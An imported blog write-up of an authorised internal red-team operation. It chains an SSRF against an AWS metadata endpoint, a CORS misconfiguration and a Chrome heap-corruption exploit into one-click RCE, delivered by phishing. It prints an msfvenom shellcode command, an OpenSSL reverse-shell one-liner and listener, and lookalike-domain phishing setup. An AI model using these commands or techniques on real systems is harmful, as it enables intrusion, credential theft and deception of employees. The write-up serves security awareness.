---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-01-18_the-tale-of-a-click-leading-to-rce.md
original_filename: 2022-01-18_the-tale-of-a-click-leading-to-rce.md
title: The Tale of a Click leading to RCE
category: documents
detected_topics:
- ssrf
- command-injection
- cors
- cloud-security
- sso
- api-security
tags:
- imported
- documents
- ssrf
- command-injection
- cors
- cloud-security
- sso
- api-security
language: en
raw_sha256: 1552d3fa13372cee04cdc7d7912aa04dac50489d9b45b3d41cd930af919e8170
text_sha256: 9ff30e452b06d167bbef74956de5d04075688cb7395eb08daa1f6eabd6691a45
ingested_at: '2026-06-28T07:32:09Z'
sensitivity: unknown
redactions_applied: false
---

# The Tale of a Click leading to RCE

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-01-18_the-tale-of-a-click-leading-to-rce.md
- Source Type: markdown
- Detected Topics: ssrf, command-injection, cors, cloud-security, sso, api-security
- Ingested At: 2026-06-28T07:32:09Z
- Redactions Applied: False
- Raw SHA256: `1552d3fa13372cee04cdc7d7912aa04dac50489d9b45b3d41cd930af919e8170`
- Text SHA256: `9ff30e452b06d167bbef74956de5d04075688cb7395eb08daa1f6eabd6691a45`


## Content

---
title: "The Tale of a Click leading to RCE"
url: "https://medium.com/manomano-tech/the-tale-of-a-click-leading-to-rce-8f68fe93545d"
authors: ["Roni Carta (@0xLupin)"]
programs: ["CatchPoint"]
bugs: ["RCE", "SSRF"]
publication_date: "2022-01-18"
added_date: "2022-10-17"
source: "pentester.land/writeups.json"
original_index: 2995
scraped_via: "browseros"
---

# The Tale of a Click leading to RCE

The Tale of a Click leading to RCE
Roni CARTA
Follow
13 min read
·
Jan 18, 2022

206

1

In today’s industry, we often hear that humans may weaken a company’s security leading to a potential breach. At ManoMano we highly disagree with this statement. The human is and will always remain our most valuable asset. That’s why one of our core principles is to place the Human First. By that we imply that our priority is to train and prepare our collaborators in order to face attacks from malicious actors. If someone falls in a trap, the human is not responsible for this mistake but the company in charge of sensitizing this person is.

In order to raise security awareness amongst ManoMano’s collaborators, we often perform Red team Operations (like the Zoom attack). Basically we take an external point of view, as an attacker would do, and build precise scenarios as transparent as possible for our collaborators. Each of our Operations are meant to be unique in order to bring new creative ways to trick ManoMano’s employees in favour of raising awareness.

Press enter or click to view image in full size

In this article we will share how it was possible to gain access to one of ManoMano’s servers. From the identification of an entry point to a phishing campaign, here is how we do Red Team Operations at ManoMano.

Entry Point: WebPageTest

At the Security Team we regularly perform scans of our infrastructure using custom reconnaissance tools. On one of our internal scans we stumbled upon an instance that we never had the chance to test: an outdated WebPageTest instance.

WebPageTest is an open source web performance tool providing diagnostics of a page. You paste the page you want to scan and it will run analysis and give back a full report with Video, Screenshots and metrics. The instance was hosted for internal use only, which means that it was accessible under ManoMano’s VPN only.

Press enter or click to view image in full size
Press enter or click to view image in full size

As an Offensive Security Engineer, the first thought that will cross your mind is: Is it vulnerable to SSRF ?

Call me maybe ?

Server Side Request Forgery (SSRF) is a security vulnerability that allows an attacker to manipulate the backend side of an application to arbitrarily request URIs of the attacker’s choosing. When the attacker can see the response of the requests the backend sends, it is called a Full Read SSRF and is the most severe variant of the vulnerability. Indeed it may be possible in this case to extract confidential information from internal services or from the adjacent network.

Since we are able to make the backend requests any URIs with WebPageTest, it is possible to confirm that there is a SSRF. However we do need to find a way to exfiltrate confidential information. Our WebPageTest instance is running on AWS. This is important because AWS is exposing a web service only for the local machine, retrieving the instance’s metadata. This endpoint was originally created in order to not install AWS CLI packages on every machine you’d deploy.

To contact the endpoint, it’s required to send a GET request over HTTP to the IPv4 169.254.169.254 which sends back confidential information such as the security-credentials of the machine.

However when submitting a scan request on WebPageTest for this IPv4, the service returns back the following error:

There was an error with the test
Sorry, 169.254.169.254 is blocked from testing

As stated above, WebPageTest is an open source project, which implies that we are able to check how this security rule was implemented. When going through the source code of runtest.php we can see that they compare the $host variable with the AWS IPv4 address using strcmp().

Because strcmp() is only used to compare two strings together this check is not efficient since it doesn’t verify if a domain points to that IP.

Let’s take for instance Project Discovery’s DNS: aws.interactsh.com.

When making a DNS request to this subdomain we can indeed notice it is pointing to the wanted IPv4:

$ dig +short aws.interactsh.com
169.254.169.254

Now we are able to query the host and bypass the security check. We then tried to fetch the credentials by pasting the following URL:

http://aws.interactsh.com/latest/meta-data/iam/security-credentials/wptagent

And we received the Security Credentials in the form of a low resolution screenshot !

How would an external attacker ever be able to exploit this vulnerability ? As mentioned above the domain is accessible only for a user using a VPN. We tried to solve this problem by abusing the CORS policy.

You Should not Pass !

Cross Origin Resource Sharing (CORS) is an HTTP-header based mechanism that allows servers indicating the browser which Origin outside of its own should be allowed to load resources.

To communicate the allowed origins with the Browser, the server-side needs to provide an Access-Control-Allow-Origin header. When a Client makes a request to a website, the server-side looks at the Origin and if it’s allowed, reflects the origin back to the client.

Sending the request

GET /resources/public-data/ HTTP/1.1
Host: foo.bar
Connection: close
Origin: https://www.manomano.fr

Receiving a response

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://www.manomano.fr
Connection: Keep-Alive
Transfer-Encoding: chunked
[Data]

If the browser notices that the Origin and the Access-Control-Allow-Origin are the same then the browser may allow the webpage to read the content of the request.

Press enter or click to view image in full size

If the CORS Policy is not set or differs from the Origin then the Browser will not allow the webpage to load the external resources. In the case of our WebPageTest instance, the CORS Policy should not have been enabled, however on every request the header was set to a wildcard:

HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
Connection: Keep-Alive
Transfer-Encoding: chunked
[Data]

In this configuration the CORS authorizes any Origin to fetch ressources of the website from the Client’s Browser. The same configuration was enabled on the page starting the scans.

POST /runtest.php HTTP/1.1
Host: internal-webpagetest.tld
Content-Type: multipart/form-data; boundary= — — WebKitFormBoundary1337roflh4ck
Origin: https://anywebsite-of-the-world.tld
— — — WebKitFormBoundary1337roflh4ck
Content-Disposition: form-data; name=”XXXXX”
…

Unfortunately this misconfiguration was not present when requesting the screenshot containing the credentials. This means that we are only able to start a scan without exfiltrating data.

$ curl “https://internal-webpagetest.tld/results/XX/XX/XX/XX/X/1_screen.jpg" -i
HTTP/1.1 200 OK
Content-Type: image/jpeg
Content-Length: 15474
Accept-Ranges: bytes
Warning: Binary output can mess up your terminal. Use “ — output -” to tell
Warning: curl to output it to your terminal anyway, or consider “ — output
Warning: <FILE>” to save to a file.

After looking around the web service, we managed to find an endpoint allowing us to load the screenshots, with a CORS misconfiguration: The thumbnail functionality. When rendering the HTML page of the scan’s summary, WebPageTest calls an endpoint to resize the image with a wildcarded CORS Policy. This may allow us to fetch the image from an arbitrary origin, and store it on our side.

$ curl “https://internal-webpagetest.tld/thumbnail.php?test=[key]&run=1&file=1_screen.jpg" -i
HTTP/2 200
date: Fri, 26 Nov 2021 11:18:40 GMT
content-type: image/jpeg
server: nginx
Access-Control-Allow-Origin: *
Warning: Binary output can mess up your terminal. Use “ — output -” to tell
Warning: curl to output it to your terminal anyway, or consider “ — output
Warning: <FILE>” to save to a file.

With all the information we gathered, we are now able to perform an exploitation chain aiming to exfiltrate the security credentials of the machine when a user connected under the VPN clicks a link.

Exploitation Chain

The first step of the exploit is to be able to start a scan on our WebPageTest from the attacker’s website by just visiting the page.

Get Roni CARTA’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

To do so we are going to forge a Javascript code that will open a request via the default object XMLHTTPRequest with the Verb, URI and content of the Request.

Before sending the request we need to add a Javascript onload event that will parse the response. In the response there is the primary key used to identify the screenshot. We need this string in order to fetch the security credentials.

When running the script will gather the confidential image encoded in format Base64 and send it out to the Attacker’s server which can then be stored and analysed to retrieve the AWS’ security credentials of the machine.

Press enter or click to view image in full size

We were able to create a Proof of Concept but after an analysis of the machine’s AWS Permissions, the credentials could not have been used for any malicious intents. This means that it was basically unexploitable for an attacker.

That’s why we didn’t stop the exploitation here, we wanted to get a Remote Code Execution.

They call it a Royale with Cheese

Sometimes when seeking for vulnerabilities, you need to restart everything from the very beginning. While some people might find it frustrating, we prefer to think that everything you do is always useful and can be kept for later.

The new goal is to find a way to execute arbitrary commands in the Backend. This type of vulnerability is called Remote Code Execution (RCE) which is the Royale with Cheese of all vulnerabilities. We wanted to comprehend how WebPageTest takes screenshots of a page. To this end we have set up a listener available to receive any data then we have launched a scan with https://our-listener.tld/ while monitoring the HTTP requests responses:

GET / HTTP/1.1
Host: our-listener.tld
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36/null
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1

As you may notice, the User-Agent shows which browser made the HTTP request. Which means that WebPageTest embeds its own browser in a Headless Mode. In this case it is a Chrome based browser, version 86.0.4240.75. At the moment of writing the article the latest release of Chrome is running the version 97.0.4692.71. The first thought was to know if between those two versions, there were any security updates mitigating Critical Flaws like RCEs.

Luckily for us, CVE-2020–16040 is affecting Chrome prior to version 87.0.4280.88 is vulnerable to heap corruption leading to RCE. When searching for any Proof of Concept of that vulnerability, we stumbled upon a great analysis of the vulnerability written by Faith. The author concludes that no exploit was available at the moment of the article release. However when searching this CVE on Github, a repository was referencing this article with a Proof Of Concept.

The difficulty when trying to use those exploits consists in transforming the Proof Of Concept into an exploitable vulnerability. The author of the repository wrote the exploit in HTML and Javascript. This means that in order to trigger the vulnerability, a victim has to visit a website containing the malicious code.

When analysing the code, we can see that at line 125 there is a shellcode.

A shellcode is a piece of code run by an attacker in an exploitation chain in order to take control of the machine executing it. In order to send arbitrary commands to the target we need to generate our own shellcode. The author also added a convert_shellcode.js file that takes a x64 shellcode in hexadecimal and converts it into a Javascript piece of code.

Our goal is to run arbitrary code on a Linux based system. Assuming that we want to execute the command id on the targeted machine, we have to first generate an hexadecimal shellcode for the x64 platform. We can do it with the help of MSFvenom. MSFvenom is a tool from Offensive Security allowing easy creation of payloads like shellcodes. For our use case we need to run the following command:

$ msfvenom -a x64 — platform linux -p linux/x64/exec CMD=”id” -f c
No encoder specified, outputting raw payload
Payload size: 39 bytes
Final size of c file: 189 bytes
unsigned char buf[] =
“\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f\x52”
“\x66\x68\x2d\x63\x54\x5e\x52\xe8\x03\x00\x00\x00\x69\x64\x00”
“\x56\x57\x54\x5e\x6a\x3b\x58\x0f\x05”;

Now we are able to run convert_shellcode.js with the x64 shellcode, resulting in:

Uint32Array(10) [
 1647294536, 1932488297,
 1352204392, 1716674388,
 1415785832, 65557086,
 1761607680, 1465253988,
 996826708, 2416250712
]

We can then paste the given array in the exploit.js file and test the exploit on a Docker machine with the vulnerable Chrome version installed:

Press enter or click to view image in full size

We successfully managed to trigger the id command in the Docker container. When fully exploiting this chain of vulnerability, it is likely that an attacker will opt to execute a Reverse Shell. A Reverse shell is a shell session initiated on the targeted machine which connects to the attacker’s host. This means that an attacker is able to remotely control the target’s machine by sending commands and getting back a response.

The chain of vulnerability now becomes a One Click Remote Code Execution. When a victim under the VPN will click our crafted link, the page will abuse the CORS policy of the WebPageTest instance in order to scan a page containing a malicious script. The script will then abuse a heap corruption in Chrome in order to trigger a reverse shell.

Press enter or click to view image in full size

Usually, other security teams would have stopped the assessment here, report to the teams and fix the vulnerability. At ManoMano we prefer to take advantage of a finding requiring social engineering to carry out a Red Team Operation. We think that One Click RCE are rare scenarios that our employees might not be aware of yet.

Red Team Preparation

When deciding to start an Operation, we first enumerate all the possible Social Engineering scenarios and pick the one that has higher chances of success. Our first question is: How could we trick a ManoMano employee into clicking on a malicious link ? We privileged ManoMano’s People’s team impersonation via a phishing attack. The People team sometimes sends emails to the collaborators in order to update on the latest internal changes. We then decided to make up a story about a brand new (fictional) Referral Program that would facilitate recruiting. At the moment of the Operation, ManoMano was announcing on the biggest Media Outlets that recruitment was their priority. Since it was publicly announced, any external malicious party could have been in possession of this kind of information.

We’ve then set up a website hosting the CORS Exploitation code, that will contact the internal WebPageTest and trigger a Remote Code Execution. Since the instance is only accessible under the VPN we added a code snippet to verify if the victim is accessing our website through ManoMano’s VPN. An attacker can easily find the VPN’s IP by sending a DNS request to vpn.manomano.com.

$ dig +short vpn.manomano.com
159.180.237.190

When the traffic is not passing through the VPN, an error will be raised asking the employee to connect to the VPN first:

Press enter or click to view image in full size

Fun fact: This page is actually designed from ManoMano’s 500 page. The hardest part in the whole Red Team was to trigger a 500 error on the Marketplace in order for us to copy the HTML code x)

Once the VPN is activated, a request to WebPageTest will be sent out and the user will be redirected to ManoMano’s blog. We then bought the domain people-manomano.com and hosted the malicious code on redirect.people-manomano.com. Using Mailgun and Gophish we’ve set up the email address noreply@people-manomano.com in order to send the malicious email.

Press enter or click to view image in full size

The email looked like the following:

Press enter or click to view image in full size

With Gophish we added a GET parameter in the redirection link to show us the ID of the person that was tricked when checking the logs. This helps us identify which collaborator fell in this exercise and then could be trained to improve their security reflexes.

The last step of our preparation was to add a Reverse Shell listener. Since we wanted to do things properly, we opted to use OpenSSL to communicate securely between the Attacker’s Listener and the targeted Machine.

Listener:

openssl s_server -quiet -key key.pem -cert cert.pem -port 1337

Opening the Reverse Shell on the Target:

mkfifo /tmp/lupin; /bin/sh -i < /tmp/lupin 2>&1 | openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/lupin; rm /tmp/lupin
Red Team Results

With everything prepared, we started a meeting in order to launch the Operation. We decided to launch the attack targeting a small group of collaborators of 15 people. After the CISO’s approval the emails were sent at 4:40 pm GMT+2.

Then at 5:08 pm GMT+2, the console shows a remote session opened by the WebPageTest machine … We are in !

We ended the operation at 7pm. In that time frame 5 people clicked on the malicious link and one reported it to the Security Team’s Slack channel alerting of a potential phishing attempt.

When an Operation of that scale is over, we need to contact all the collaborators that have been Social Engineered and explain to them the technical behind such an attack. The purpose of such an operation is to raise their awareness, not to blame them. The main goal is to prepare our collaborators while trying to spark their curiosity for ManoMano’s Offensive Security Culture.

Conclusion

Nowadays it’s a popular belief that clicking a link can’t cause any harm. This is true for most attack attempts using Social Engineering; However, in some cases, an attacker can leverage critical vulnerabilities requiring the victim to simply visit a webpage. Being in possession of a vulnerability that could start a Reverse Shell from a single click is highly powerful in a Social Engineering attack. Therefore, how can we protect ourselves from this kind of attack ? Like any phishing attempts there are some “clues” in the email that could have helped to spot the attack.

First of all the email ends with @people-manomano.com which is purposely made to be mistaken with @manomano.com.

Press enter or click to view image in full size

Moreover by hovering the mouse on the “Let’s Go Button” we can see that it is sending the user to redirect.people-manomano.com.

Press enter or click to view image in full size

By simply checking the sender, and the link before clicking could help prevent some attacks. Additionally, we entice ManoMano employees to consult the Security Team when spotting a suspicious email.

Chaining vulnerabilities like shown in this article is still rare and not widely used by malicious actors. Finding that kind of chain requires a lot of time and creativity.

I want to personally thank the Pulse team who helped us logging and mitigating the vulnerability. They were also present in the Red Team Operation room which was awesome ! ❤
